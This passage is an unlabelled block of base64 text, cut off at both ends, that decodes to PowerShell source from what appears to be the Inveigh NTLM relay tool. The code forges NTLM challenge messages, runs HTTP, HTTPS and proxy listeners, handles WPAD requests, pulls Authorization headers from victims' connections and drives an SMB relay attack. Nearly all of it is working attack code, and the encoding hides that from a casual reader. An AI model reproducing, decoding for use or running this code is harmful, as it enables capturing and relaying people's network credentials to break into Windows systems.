oYWxsZW5nZUJhc2U2NAogICAgewogICAgICAgIHBhcmFtIChbU3RyaW5nXSRDaGFsbGVuZ2UsW1N0cmluZ10kQ2xpZW50SVBBZGRyZXNzLFtJbnRdJENsaWVudFBvcnQpCgogICAgICAgICRIVFRQX3RpbWVzdGFtcCA9IEdldC1EYXRlCiAgICAgICAgJEhUVFBfdGltZXN0YW1wID0gJEhUVFBfdGltZXN0YW1wLlRvRmlsZVRpbWUoKQogICAgICAgICRIVFRQX3RpbWVzdGFtcCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpHZXRCeXRlcygkSFRUUF90aW1lc3RhbXApKQogICAgICAgICRIVFRQX3RpbWVzdGFtcCA9ICRIVFRQX3RpbWVzdGFtcC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CgogICAgICAgIGlmKCRDaGFsbGVuZ2UpCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2UgPSAkQ2hhbGxlbmdlCiAgICAgICAgICAgICRIVFRQX2NoYWxsZW5nZV9ieXRlcyA9ICRIVFRQX2NoYWxsZW5nZS5JbnNlcnQoMiwnLScpLkluc2VydCg1LCctJykuSW5zZXJ0KDgsJy0nKS5JbnNlcnQoMTEsJy0nKS5JbnNlcnQoMTQsJy0nKS5JbnNlcnQoMTcsJy0nKS5JbnNlcnQoMjAsJy0nKQogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgPSAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgPSBbU3RyaW5nXSgxLi44IHwgRm9yRWFjaC1PYmplY3R7InswOlgyfSIgLWYgKEdldC1SYW5kb20gLU1pbmltdW0gMSAtTWF4aW11bSAyNTUpfSkKICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlX2J5dGVzIC1yZXBsYWNlICcgJywnJwogICAgICAgICAgICAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMgPSAkSFRUUF9jaGFsbGVuZ2VfYnl0ZXMuU3BsaXQoIiAiKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgIH0KCiAgICAgICAgJGludmVpZ2guSFRUUF9jaGFsbGVuZ2VfcXVldWUuQWRkKCRDbGllbnRJUEFkZHJlc3MgKyAkQ2xpZW50UG9ydCArICcsJyArICRIVFRQX2NoYWxsZW5nZSkgID4gJG51bGwKCiAgICAgICAgJEhUVFBfTlRMTV9ieXRlcyA9IDB4NGUsMHg1NCwweDRjLDB4NGQsMHg1MywweDUzLDB4NTAsMHgwMCwweDAyLDB4MDAsMHgwMCwweDAwLDB4MDYsMHgwMCwweDA2LDB4MDAsMHgzOCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDUsMHg4MiwweDg5LDB4YTIgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEhUVFBfY2hhbGxlbmdlX2J5dGVzICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDgyLDB4MDAsMHg4MiwweDAwLDB4M2UsMHgwMCwweDAwLDB4MDAsMHgwNiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDEsMHhiMSwweDFkLDB4MDAsMHgwMCwweDAwLDB4MGYsMHg0YywweDAwLDB4NDEsMHgwMCwweDQyLDB4MDAsMHgwMiwweDAwLDB4MDYsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NGMsMHgwMCwweDQxLDB4MDAsMHg0MiwweDAwLDB4MDEsMHgwMCwweDEwLDB4MDAsMHg0OCwweDAwLDB4NGYsMHgwMCwweDUzLDB4MDAsMHg1NCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg0ZSwweDAwLDB4NDEsMHgwMCwweDRkLDB4MDAsMHg0NSwweDAwLDB4MDQsMHgwMCwweDEyLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NjIsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLDB4NmYsMHgwMCwweDYzLDB4MDAsMHg2MSwweDAwLDB4NmMsMHgwMCwweDAzLDB4MDAsMHgyNCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg2OCwweDAwLDB4NmYsMHgwMCwweDczLDB4MDAsMHg3NCwweDAwLDB4NmUsMHgwMCwweDYxLDB4MDAsMHg2ZCwweDAwLDB4NjUsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MmUsMHgwMCwweDZjLDB4MDAsMHg2MSwweDAwLDB4NjIsMHgwMCwweDJlLDB4MDAsMHg2YywweDAwLDB4NmYsMHgwMCwweDYzLDB4MDAsMHg2MSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4MDAsMHg2YywweDAwLDB4MDUsMHgwMCwweDEyLDB4MDAsMHg2YywweDAwLDB4NjEsMHgwMCwweDYyLDB4MDAsMHgyZSwweDAwLDB4NmMsMHgwMCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgIDB4NmYsMHgwMCwweDYzLDB4MDAsMHg2MSwweDAwLDB4NmMsMHgwMCwweDA3LDB4MDAsMHgwOCwweDAwICsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRIVFRQX3RpbWVzdGFtcCArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAwLDB4MDAsMHgwMCwweDAwLDB4MGEsMHgwYQoKICAgICAgICAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0ID0gW1N5c3RlbS5Db252ZXJ0XTo6VG9CYXNlNjRTdHJpbmcoJEhUVFBfTlRMTV9ieXRlcykKICAgICAgICAkTlRMTSA9ICdOVExNICcgKyAkTlRMTV9jaGFsbGVuZ2VfYmFzZTY0CiAgICAgICAgJE5UTE1fY2hhbGxlbmdlID0gJEhUVFBfY2hhbGxlbmdlCgogICAgICAgIHJldHVybiAkTlRMTQogICAgfQoKICAgIGlmKCRIVFRQU19saXN0ZW5lcikKICAgIHsKICAgICAgICAkSFRUUF90eXBlID0gIkhUVFBTIgogICAgfQogICAgZWxzZWlmKCRwcm94eV9saXN0ZW5lcikKICAgIHsKICAgICAgICAkSFRUUF90eXBlID0gIlByb3h5IgogICAgfQogICAgZWxzZQogICAgewogICAgICAgICRIVFRQX3R5cGUgPSAiSFRUUCIKICAgIH0KCiAgICBpZigkSFRUUElQIC1uZSAnMC4wLjAuMCcpCiAgICB7CiAgICAgICAgJEhUVFBJUCA9IFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OlBhcnNlKCRIVFRQSVApCiAgICAgICAgJEhUVFBfZW5kcG9pbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuSVBFbmRQb2ludCgkSFRUUElQLCRIVFRQUG9ydCkKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICAkSFRUUF9lbmRwb2ludCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5JUEVuZFBvaW50KFtTeXN0ZW0uTmV0LklQQWRkcmVzc106OmFueSwkSFRUUFBvcnQpCiAgICB9CgogICAgJEhUVFBfcnVubmluZyA9ICR0cnVlCiAgICAkSFRUUF9saXN0ZW5lciA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRjcExpc3RlbmVyICRIVFRQX2VuZHBvaW50CiAgICAkSFRUUF9jbGllbnRfY2xvc2UgPSAkdHJ1ZQogICAgJHJlbGF5X3N0ZXAgPSAwCgogICAgaWYoJHByb3h5X2xpc3RlbmVyKQogICAgewogICAgICAgICRIVFRQX2xpbmdlciA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLkxpbmdlck9wdGlvbigkdHJ1ZSwwKQogICAgICAgICRIVFRQX2xpc3RlbmVyLlNlcnZlci5MaW5nZXJTdGF0ZSA9ICRIVFRQX2xpbmdlcgogICAgfQoKICAgIHRyeQogICAgewogICAgICAgICRIVFRQX2xpc3RlbmVyLlN0YXJ0KCkKICAgIH0KICAgIGNhdGNoCiAgICB7CiAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gRXJyb3Igc3RhcnRpbmcgJEhUVFBfdHlwZSBsaXN0ZW5lciIpCiAgICAgICAgJEhUVFBfcnVubmluZyA9ICRmYWxzZQoKICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICB7CiAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBFcnJvciBzdGFydGluZyAkSFRUUF90eXBlIGxpc3RlbmVyIikKICAgICAgICB9CgogICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgewogICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIEVycm9yIHN0YXJ0aW5nICRIVFRQX3R5cGUgbGlzdGVuZXIiKQogICAgICAgIH0KCiAgICB9CgogICAgOkhUVFBfbGlzdGVuZXJfbG9vcCB3aGlsZSgkaW52ZWlnaC5yZWxheV9ydW5uaW5nIC1hbmQgJEhUVFBfcnVubmluZykKICAgIHsKICAgICAgICAkVENQX3JlcXVlc3QgPSAiIgogICAgICAgICRUQ1BfcmVxdWVzdF9ieXRlcyA9IE5ldy1PYmplY3QgU3lzdGVtLkJ5dGVbXSA0MDk2CiAgICAgICAgJEhUVFBfc2VuZCA9ICR0cnVlCiAgICAgICAgJEhUVFBfaGVhZGVyX2NvbnRlbnRfdHlwZSA9IDB4NDMsMHg2ZiwweDZlLDB4NzQsMHg2NSwweDZlLDB4NzQsMHgyZCwweDU0LDB4NzksMHg3MCwweDY1LDB4M2EsMHgyMCArIFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoInRleHQvaHRtbCIpCiAgICAgICAgJEhUVFBfaGVhZGVyX2NhY2hlX2NvbnRyb2wgPSAiIgogICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGUgPSAiIgogICAgICAgICRIVFRQX2hlYWRlcl9hdXRoZW50aWNhdGVfZGF0YSA9ICIiCiAgICAgICAgJEhUVFBfbWVzc2FnZSA9ICIiCiAgICAgICAgJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb24gPSAgIiIKICAgICAgICAkSFRUUF9oZWFkZXJfaG9zdCA9ICIiCiAgICAgICAgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgPSAiIgogICAgICAgICRIVFRQX3JlcXVlc3RfcmF3X1VSTCA9ICIiCiAgICAgICAgJE5UTE0gPSAiTlRMTSIKICAgICAgICAKICAgICAgICB3aGlsZSghJEhUVFBfbGlzdGVuZXIuUGVuZGluZygpIC1hbmQgISRIVFRQX2NsaWVudC5Db25uZWN0ZWQpCiAgICAgICAgewogICAgICAgICAgICBTdGFydC1TbGVlcCAtbSAxMAoKICAgICAgICAgICAgaWYoISRpbnZlaWdoLnJlbGF5X3J1bm5pbmcpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJyZWFrIEhUVFBfbGlzdGVuZXJfbG9vcAogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmKCRyZWxheV9zdGVwIC1ndCAwKQogICAgICAgIHsKICAgICAgICAgICAgJHJlbGF5X3Jlc2V0KysKCiAgICAgICAgICAgIGlmKCRyZWxheV9yZXNldCAtZ3QgMikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIlNNQiByZWxheSBhdHRhY2sgcmVzZXR0aW5nIikKICAgICAgICAgICAgICAgICRTTUJfcmVsYXlfc29ja2V0LkNsb3NlKCkKICAgICAgICAgICAgICAgICRyZWxheV9zdGVwID0gMAoKICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmZpbGVfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSBTTUIgcmVsYXkgYXR0YWNrIHJlc2V0dGluZyIpCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIFNNQiByZWxheSBhdHRhY2sgcmVzZXR0aW5nIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgICRyZWxheV9yZXNldCA9IDAKICAgICAgICB9CgogICAgICAgIGlmKCRIVFRQU19saXN0ZW5lcikKICAgICAgICB7CiAgICAgICAgICAgIAogICAgICAgICAgICBpZighJEhUVFBfY2xpZW50LkNvbm5lY3RlZCAtb3IgJEhUVFBfY2xpZW50X2Nsb3NlIC1hbmQgJGludmVpZ2gucmVsYXlfcnVubmluZykKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfY2xpZW50ID0gJEhUVFBfbGlzdGVuZXIuQWNjZXB0VGNwQ2xpZW50KCkgCgkgICAgICAgICAgICAkSFRUUF9jbGVhcl9zdHJlYW0gPSAkSFRUUF9jbGllbnQuR2V0U3RyZWFtKCkKICAgICAgICAgICAgICAgICRIVFRQX3N0cmVhbSA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5TZWN1cml0eS5Tc2xTdHJlYW0oJEhUVFBfY2xlYXJfc3RyZWFtLCRmYWxzZSkKICAgICAgICAgICAgICAgICRTU0xfY2VydCA9IChHZXQtQ2hpbGRJdGVtIENlcnQ6XExvY2FsTWFjaGluZVxNeSB8IFdoZXJlLU9iamVjdCB7JF8uU3ViamVjdCAtbWF0Y2ggJGludmVpZ2guY2VydGlmaWNhdGVfQ059KQogICAgICAgICAgICAgICAgJEhUVFBfc3RyZWFtLkF1dGhlbnRpY2F0ZUFzU2VydmVyKCRTU0xfY2VydCwkZmFsc2UsW1N5c3RlbS5TZWN1cml0eS5BdXRoZW50aWNhdGlvbi5Tc2xQcm90b2NvbHNdOjpEZWZhdWx0LCRmYWxzZSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgW2J5dGVbXV0kU1NMX3JlcXVlc3RfYnl0ZXMgPSAkbnVsbAoKICAgICAgICAgICAgZG8gCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX3JlcXVlc3RfYnl0ZV9jb3VudCA9ICRIVFRQX3N0cmVhbS5SZWFkKCRUQ1BfcmVxdWVzdF9ieXRlcywwLCRUQ1BfcmVxdWVzdF9ieXRlcy5MZW5ndGgpCiAgICAgICAgICAgICAgICAkU1NMX3JlcXVlc3RfYnl0ZXMgKz0gJFRDUF9yZXF1ZXN0X2J5dGVzWzAuLigkSFRUUF9yZXF1ZXN0X2J5dGVfY291bnQgLSAxKV0KICAgICAgICAgICAgfSB3aGlsZSAoJEhUVFBfY2xlYXJfc3RyZWFtLkRhdGFBdmFpbGFibGUpCgogICAgICAgICAgICAkVENQX3JlcXVlc3QgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRTU0xfcmVxdWVzdF9ieXRlcykKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKCiAgICAgICAgICAgIGlmKCEkSFRUUF9jbGllbnQuQ29ubmVjdGVkIC1vciAkSFRUUF9jbGllbnRfY2xvc2UgLWFuZCAkaW52ZWlnaC5yZWxheV9ydW5uaW5nKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSFRUUF9jbGllbnQgPSAkSFRUUF9saXN0ZW5lci5BY2NlcHRUY3BDbGllbnQoKSAKCSAgICAgICAgICAgICRIVFRQX3N0cmVhbSA9ICRIVFRQX2NsaWVudC5HZXRTdHJlYW0oKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkSFRUUF9zdHJlYW0uRGF0YUF2YWlsYWJsZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfZGF0YV9hdmFpbGFibGUgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfZGF0YV9hdmFpbGFibGUgPSAkZmFsc2UKICAgICAgICAgICAgfQoKICAgICAgICAgICAgd2hpbGUoJEhUVFBfc3RyZWFtLkRhdGFBdmFpbGFibGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX3N0cmVhbS5SZWFkKCRUQ1BfcmVxdWVzdF9ieXRlcywwLCRUQ1BfcmVxdWVzdF9ieXRlcy5MZW5ndGgpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICRUQ1BfcmVxdWVzdCA9IFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJFRDUF9yZXF1ZXN0X2J5dGVzKQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZigkVENQX3JlcXVlc3QgLWxpa2UgIjQ3LTQ1LTU0LTIwKiIgLW9yICRUQ1BfcmVxdWVzdCAtbGlrZSAiNDgtNDUtNDEtNDQtMjAqIiAtb3IgJFRDUF9yZXF1ZXN0IC1saWtlICI0Zi01MC01NC00OS00Zi00ZS01My0yMCoiIC1vciAkVENQX3JlcXVlc3QgLWxpa2UgIjQzLTRmLTRlLTRlLTQ1LTQzLTU0KiIpCiAgICAgICAgewogICAgICAgICAgICAkSFRUUF9yYXdfVVJMID0gJFRDUF9yZXF1ZXN0LlN1YnN0cmluZygkVENQX3JlcXVlc3QuSW5kZXhPZigiLTIwLSIpICsgNCwkVENQX3JlcXVlc3QuU3Vic3RyaW5nKCRUQ1BfcmVxdWVzdC5JbmRleE9mKCItMjAtIikgKyAxKS5JbmRleE9mKCItMjAtIikgLSAzKQogICAgICAgICAgICAkSFRUUF9yYXdfVVJMID0gJEhUVFBfcmF3X1VSTC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICRIVFRQX3JlcXVlc3RfcmF3X1VSTCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJEhUVFBfcmF3X1VSTCwwLCRIVFRQX3Jhd19VUkwuTGVuZ3RoKQogICAgICAgICAgICAkSFRUUF9zb3VyY2VfSVAgPSAkSFRUUF9jbGllbnQuQ2xpZW50LlJlbW90ZUVuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcKCiAgICAgICAgICAgIGlmKCRUQ1BfcmVxdWVzdCAtbGlrZSAiKi00OC02Ri03My03NC0zQS0yMC0qIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdCA9ICRUQ1BfcmVxdWVzdC5TdWJzdHJpbmcoJFRDUF9yZXF1ZXN0LkluZGV4T2YoIi00OC02Ri03My03NC0zQS0yMC0iKSArIDE5KQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdCA9ICRIVFRQX2hlYWRlcl9ob3N0X2V4dHJhY3QuU3Vic3RyaW5nKDAsJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdC5JbmRleE9mKCItMEQtMEEtIikpCiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfaG9zdF9leHRyYWN0ID0gJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdC5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAkSFRUUF9oZWFkZXJfaG9zdCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJEhUVFBfaGVhZGVyX2hvc3RfZXh0cmFjdCwwLCRIVFRQX2hlYWRlcl9ob3N0X2V4dHJhY3QuTGVuZ3RoKQogICAgICAgICAgICB9CgogICAgICAgICAgICBpZigkVENQX3JlcXVlc3QgLWxpa2UgIiotNTUtNzMtNjUtNzItMkQtNDEtNjctNjUtNkUtNzQtM0EtMjAtKiIpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QgPSAkVENQX3JlcXVlc3QuU3Vic3RyaW5nKCRUQ1BfcmVxdWVzdC5JbmRleE9mKCItNTUtNzMtNjUtNzItMkQtNDEtNjctNjUtNkUtNzQtM0EtMjAtIikgKyAzNykKICAgICAgICAgICAgICAgICRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QgPSAkSFRUUF9oZWFkZXJfdXNlcl9hZ2VudF9leHRyYWN0LlN1YnN0cmluZygwLCRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QuSW5kZXhPZigiLTBELTBBLSIpKQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnRfZXh0cmFjdCA9ICRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QuU3BsaXQoIi0iKSB8IEZvckVhY2gtT2JqZWN0e1tDaGFyXVtTeXN0ZW0uQ29udmVydF06OlRvSW50MTYoJF8sMTYpfQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5TdHJpbmcgKCRIVFRQX2hlYWRlcl91c2VyX2FnZW50X2V4dHJhY3QsMCwkSFRUUF9oZWFkZXJfdXNlcl9hZ2VudF9leHRyYWN0Lkxlbmd0aCkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgaWYoJEhUVFBfcmVxdWVzdF9yYXdfVVJMX29sZCAtbmUgJEhUVFBfcmVxdWVzdF9yYXdfVVJMIC1vciAkSFRUUF9jbGllbnRfaGFuZGxlX29sZCAtbmUgJEhUVFBfY2xpZW50LkNsaWVudC5IYW5kbGUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgcmVxdWVzdCBmb3IgJEhUVFBfcmVxdWVzdF9yYXdfVVJMIHJlY2VpdmVkIGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgICRpbnZlaWdoLmNvbnNvbGVfcXVldWUuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgaG9zdCBoZWFkZXIgJEhUVFBfaGVhZGVyX2hvc3QgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB1c2VyIGFnZW50IHJlY2VpdmVkIGZyb20gJEhUVFBfc291cmNlX0lQYDpgbiRIVFRQX2hlYWRlcl91c2VyX2FnZW50IikKCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSByZXF1ZXN0IGZvciAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZ19maWxlX3F1ZXVlLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIGhvc3QgaGVhZGVyICRIVFRQX2hlYWRlcl9ob3N0IHJlY2VpdmVkIGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSB1c2VyIGFnZW50ICRIVFRQX2hlYWRlcl91c2VyX2FnZW50IHJlY2VpdmVkIGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5sb2dfb3V0cHV0KQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSByZXF1ZXN0IGZvciAkSFRUUF9yZXF1ZXN0X3Jhd19VUkwgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgICAgICRpbnZlaWdoLmxvZy5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBob3N0IGhlYWRlciAkSFRUUF9oZWFkZXJfaG9zdCByZWNlaXZlZCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2gubG9nLkFkZCgiJChHZXQtRGF0ZSAtZm9ybWF0ICdzJykgLSAkSFRUUF90eXBlIHVzZXIgYWdlbnQgJEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgcmVjZWl2ZWQgZnJvbSAkSFRUUF9zb3VyY2VfSVAiKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmKCRQcm94eSAtZXEgJ1knIC1hbmQgJFByb3h5SWdub3JlLkNvdW50IC1ndCAwIC1hbmQgKCRQcm94eUlnbm9yZSB8IFdoZXJlLU9iamVjdCB7JEhUVFBfaGVhZGVyX3VzZXJfYWdlbnQgLW1hdGNoICRffSkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBpZ25vcmluZyB3cGFkLmRhdCByZXF1ZXN0IGR1ZSB0byB1c2VyIGFnZW50IGZyb20gJEhUVFBfc291cmNlX0lQIikKCiAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2guZmlsZV9vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gJEhUVFBfdHlwZSBpZ25vcmluZyB3cGFkLmRhdCByZXF1ZXN0IGR1ZSB0byB1c2VyIGFnZW50IGZyb20gJEhUVFBfc291cmNlX0lQIikKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIGlmKCRpbnZlaWdoLmxvZ19vdXRwdXQpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtICRIVFRQX3R5cGUgaWdub3Jpbmcgd3BhZC5kYXQgcmVxdWVzdCBkdWUgdG8gdXNlciBhZ2VudCBmcm9tICRIVFRQX3NvdXJjZV9JUCIpCiAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmKCRUQ1BfcmVxdWVzdCAtbGlrZSAiKi00MS03NS03NC02OC02Ri03Mi02OS03QS02MS03NC02OS02Ri02RS0zQS0yMC0qIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdCA9ICRUQ1BfcmVxdWVzdC5TdWJzdHJpbmcoJFRDUF9yZXF1ZXN0LkluZGV4T2YoIi00MS03NS03NC02OC02Ri03Mi02OS03QS02MS03NC02OS02Ri02RS0zQS0yMC0iKSArIDQ2KQogICAgICAgICAgICAgICAgJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdCA9ICRIVFRQX2hlYWRlcl9hdXRob3JpemF0aW9uX2V4dHJhY3QuU3Vic3RyaW5nKDAsJEhUVFBfaGVhZGVyX2F1dGhvcml6YXRpb25fZXh0cmFjdC5JbmRleE9mKCItMEQtMEEtIikpCiAg